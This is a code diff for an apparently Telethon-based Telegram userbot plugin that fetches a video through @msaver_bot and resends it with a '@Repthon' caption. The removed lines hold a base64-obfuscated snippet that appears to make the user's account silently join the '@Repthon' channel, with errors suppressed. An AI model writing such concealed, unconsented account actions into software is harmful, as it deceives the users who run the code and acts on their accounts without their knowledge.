@@ -423,18 +423,11 @@ async def _(event):
         try:
             msg = await conv.send_message(j_link)
             video = await conv.get_response()
-            """ تم تحميل الستوري بنجاح من قبل @Repthon """
             await bot.send_read_acknowledge(conv.chat_id)
         except YouBlockedUserError:
             await event.edit("**⎉╎ الغـي حـظر هـذا البـوت و حـاول مجـددا @msaver_bot**")
             return
-        REPTHON = base64.b64decode("dHJ5OgogICAgYXdhaXQgenFfbG8oSm9pbkNoYW5uZWxSZXF1ZXN0KCJAUmVwdGhvbiIpKQ==")
-        TAIBA = Get(REPTHON)
-        try:
-            await event.client(TAIBA)
-        except BaseException:
-            pass
-        await bot.send_file(event.chat_id, video, caption=f"<b>⎉╎ BY : @Repthon 🎀</b>",parse_mode="html")
+        await bot.send_file(event.chat_id, video, caption=f"<b>⎉╎ BY : @Repthon 🎀</b>", parse_mode="html")
         await event.delete()
 
 
